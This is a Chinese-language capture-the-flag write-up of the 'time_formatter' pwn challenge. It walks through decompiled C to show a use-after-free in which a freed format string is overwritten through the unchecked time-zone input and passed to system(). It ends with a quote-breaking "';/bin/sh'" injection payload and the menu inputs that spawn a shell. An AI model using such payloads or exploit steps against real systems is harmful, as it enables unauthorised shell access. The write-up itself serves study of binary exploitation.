# time_formatter

题目来源：https://adworld.xctf.org.cn/task/

这道题目是一个堆中经典漏洞 UAF 的简单利用，我虽然最后看出了是这个问题，但是可惜没有继续想下去错失了做出来的机会。那么看一下这道题的安全防护：

```
Arch:     amd64-64-little                                               
RELRO:    Partial RELRO                                                 
Stack:    Canary found                                                   
NX:       NX enabled                                                     
PIE:      No PIE (0x400000)                                           
FORTIFY:  Enabled
```

这道题对栈上的防护做的很到位，基本上可以从防护措施上排除使用栈的可能了，下面看一下源代码，有点长只能分模块来看：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __gid_t v3; // eax
  FILE *v4; // rdi
  __int64 v5; // rdx
  int v6; // eax
  __int64 result; // rax

  v3 = getegid();
  setresgid(v3, v3, v3);
  setbuf(stdout, 0LL);
  puts("Welcome to Mary's Unix Time Formatter!");
  while ( 1 )
  {
    puts("1) Set a time format.");
    puts("2) Set a time.");
    puts("3) Set a time zone.");
    puts("4) Print your time.");
    puts("5) Exit.");
    __printf_chk(1LL, "> ");
    v4 = stdout;
    fflush(stdout);
    switch ( switch() )
    {
      case 1:
        v6 = set_time_format();
        goto LABEL_8;
      case 2:
        v6 = set_time();
        goto LABEL_8;
      case 3:
        v6 = set_time_zone();
        goto LABEL_8;
      case 4:
        v6 = print_time((__int64)v4, (__int64)"> ", v5);
LABEL_8:
        if ( !v6 )
          continue;
        return 0LL;
      case 5:
        exit();
        return result;
      default:
        continue;
    }
  }
}
```

main 函数是一个简单的 menu，一共有五个选项，依次是设置打印格式、设置时间、设置时区、打印时间和退出，一个一个来看代码：

```c
__int64 set_time_format()
{
  char *v0; // rbx

  v0 = input_format();
  if ( (unsigned int)check_input(v0) )
  {
    ptr = v0;
    puts("Format set.");
  }
  else
  {
    puts("Format contains invalid characters.");
    free_ptr(v0);
  }
  return 0LL;
}

char *input_format()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  char s[1024]; // [rsp+8h] [rbp-410h]
  unsigned __int64 v4; // [rsp+408h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "%s");
  fflush(stdout);
  fgets(s, 1024, stdin);
  s[strcspn(s, "\n")] = 0;
  return sub_400C26(s, (__int64)"\n", v0, v1);
}

char *__fastcall sub_400C26(const char *a1, __int64 a2, __int64 a3, __int64 a4)
{
  char *v4; // rax
  char *v5; // rbx
  __int64 v7; // [rsp-8h] [rbp-18h]

  v7 = a4;
  v4 = strdup(a1);
  if ( !v4 )
    err(1, "strdup", v7);
  v5 = v4;
  if ( getenv("DEBUG") )
    __fprintf_chk(stderr, 1LL, "strdup(%p) = %p\n", a1);
  return v5;
}

_BOOL8 __fastcall check_input(char *s)
{
  char accept; // [rsp+5h] [rbp-43h]
  unsigned __int64 v3; // [rsp+38h] [rbp-10h]

  strcpy(&accept, "%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# ");
  v3 = __readfsqword(0x28u);
  return strspn(s, &accept) == strlen(s);
}
```

上面的函数都是和输入时间格式有关，可以看到对于时间格式的输入还是比较严格的。首先限制了长度最多 1024，然后有意思的是使用了 strdup，相当于使用了 malloc 开辟了一块堆空间存储了时间格式字符串，然后返回地址赋予 ptr。接着还需要检查时间格式的正确性，即保证里面的字符都是合法的。

```c
__int64 set_time()
{
  int v0; // eax
  const char *v1; // rdi

  __printf_chk(1LL, "Enter your unix time: ");
  fflush(stdout);
  v0 = switch();
  v1 = "Unix time must be positive";
  if ( v0 >= 0 )
  {
    time = v0;
    v1 = "Time set.";
  }
  puts(v1);
  return 0LL;
}
```

这个没什么好说就是输入一个整数作为时间。

```c
__int64 set_time_zone()
{
  value = input_format();
  puts("Time zone set.");
  return 0LL;
}
```

设置时区，和设置时间格式字符串类似，也需要使用 strdup 开辟内存空间。

```c
__int64 __fastcall print_time(__int64 a1, __int64 a2, __int64 a3)
{
  char command; // [rsp+8h] [rbp-810h]
  unsigned __int64 v5; // [rsp+808h] [rbp-10h]

  v5 = __readfsqword(0x28u);
  if ( ptr )
  {
    __snprintf_chk(
      (__int64)&command,
      2048LL,
      1LL,
      2048LL,
      (__int64)"/bin/date -d @%d +'%s'",
      (unsigned int)time,
      (__int64)ptr,
      a3);
    __printf_chk(1LL, "Your formatted time is: ");
    fflush(stdout);
    if ( getenv("DEBUG") )
      __fprintf_chk(stderr, 1LL, "Running command: %s\n", &command);
    setenv("TZ", value, 1);
    system(&command);
  }
  else
  {
    puts("You haven't specified a format!");
  }
  return 0LL;
}
```

打印的时候使用 sprintf 将 ptr 和 time 的值赋予目标命令字符串，随后使用 system 来执行输出。

```c
signed __int64 __noreturn exit()
{
  signed __int64 result; // rax
  char s; // [rsp+8h] [rbp-20h]
  unsigned __int64 v2; // [rsp+18h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  free_ptr(ptr);
  free_ptr(value);
  __printf_chk(1LL, "Are you sure you want to exit (y/N)? ");
  fflush(stdout);
  fgets(&s, 16, stdin);
  result = 0LL;
  if ( (s & 0xDF) == 89 )
  {
    puts("OK, exiting.");
    result = 1LL;
  }
  return result;
}
```

退出并回收内存。

---

仔细观察上面的函数调用，可以稍微找到一些线索，由于很难构造栈溢出，所以不去考虑和栈溢出有关的方法，这样看唯独有这些思路：

1. 有现成的 system 函数执行命令，不过 command 字符串部分受控，最好能够借助 command 字符串构造 比如 /bin/sh 的命令。
2. exit 函数其实给了一个讯息，它在退出之前 free 了指针，但是最后没有置为 NULL，说明存在 UAF 的问题。

那么 command 字符串是受到 ptr 字符串控制的，但是思考一下，当第一次给 ptr 分配内存后释放，ptr 并没有置空，所以假设我们立刻申请一片和它一样大小的区域，进程优先分配之前被释放的区域，这样 ptr 又投入的使用。并且虽然对于 ptr 的内容是有检查的，但是对于时区的输入是没有检查的，所以可以通过释放 ptr 再申请时区，覆盖原来 ptr 中的字符串为 /bin/sh，就达到了最终的目标。只需要使得目标字符串变为：

```
"\';/bin/sh\'"
```

其中两个单引号是为了取消前后的单引号对最终构造的命令字符串的影响。所以输入序列为：

```
1
'test'
5
3
"\';/bin/sh\'"
4
```

